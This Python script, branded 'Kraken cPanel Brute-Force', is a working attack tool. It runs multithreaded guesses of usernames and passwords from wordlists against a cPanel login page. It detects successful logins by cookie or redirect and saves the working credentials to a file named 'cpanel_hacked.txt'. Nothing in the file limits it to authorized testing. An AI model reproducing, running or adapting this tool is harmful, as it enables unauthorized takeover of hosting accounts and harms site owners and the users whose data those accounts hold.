import os
import sys
import time
import logging
import requests
from concurrent.futures import ThreadPoolExecutor
from random import choice
from colorama import Fore, Style, init
import pyfiglet


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'cpanel_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the banner for the script."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken cPanel Brute-Force")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def load_file(file_path):
    """Loads usernames or passwords from a specified file."""
    if os.path.isfile(file_path):
        with open(file_path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    else:
        logging.error(f"File not found: {file_path}")
        sys.exit(1)

def attempt_login(cpanel_url, username, password, attempt_number, total_attempts, start_time):
    """Attempts to log in to the cPanel with provided credentials."""
    try:
        session = requests.Session()
        response = session.post(f"{cpanel_url}/login/", data={'user': username, 'pass': password}, timeout=10)

        
        if 'cpanel' in session.cookies.get_dict():
            success_msg = f"Success: {username}:{password} @ {cpanel_url}"
            logging.info(success_msg)
            with open(os.path.join(results_dir, 'cpanel_hacked.txt'), 'a') as result_file:
                result_file.write(success_msg + "\n")
            print(Style.BRIGHT + Fore.GREEN + f"\n[{attempt_number}/{total_attempts}] {success_msg}" + Style.RESET_ALL)
            return success_msg

        
        if "redirect_to" in response.text.lower() or response.url.endswith("/home"):
            success_msg = f"Success: {username}:{password} @ {cpanel_url}"
            logging.info(success_msg)
            with open(os.path.join(results_dir, 'cpanel_hacked.txt'), 'a') as result_file:
                result_file.write(success_msg + "\n")
            print(Style.BRIGHT + Fore.GREEN + f"\n[{attempt_number}/{total_attempts}] {success_msg}" + Style.RESET_ALL)
            return success_msg

        
        fail_msg = f"[{attempt_number}/{total_attempts}] Failed: {username}:{password}"
        print(Fore.WHITE + fail_msg, end='\r')
        logging.debug(fail_msg)
        return None

    except requests.exceptions.RequestException as e:
        error_msg = f"Error: {username}:{password} - {str(e)}"
        logging.error(error_msg)
        return None

def run_bruteforce(cpanel_url, usernames, passwords, threads):
    """Executes brute-force login attempts using ThreadPoolExecutor."""
    total_attempts = len(usernames) * len(passwords)
    start_time = time.time()
    attempt_number = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                attempt_number += 1
                futures.append(executor.submit(attempt_login, cpanel_url, username, password, attempt_number, total_attempts, start_time))

        for future in futures:
            future.result()  

def get_user_input():
    """Prompts the user for input and validates it."""
    print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
    cpanel_url = input(Fore.WHITE + "Enter the cPanel URL (e.g., http://example.com:2083): ").strip()
    if not cpanel_url:
        print(Fore.RED + "cPanel URL cannot be empty.")
        sys.exit(1)

    user_file = input(Fore.WHITE + "Enter path to username list (default: users.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
    usernames = load_file(user_file)

    pwd_file = input(Fore.WHITE + "Enter path to password list (default: passwords.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    passwords = load_file(pwd_file)

    threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)

    return cpanel_url, usernames, passwords, threads

def main():
    clear_console()
    display_banner()
    cpanel_url, usernames, passwords, threads = get_user_input()
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_bruteforce(cpanel_url, usernames, passwords, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
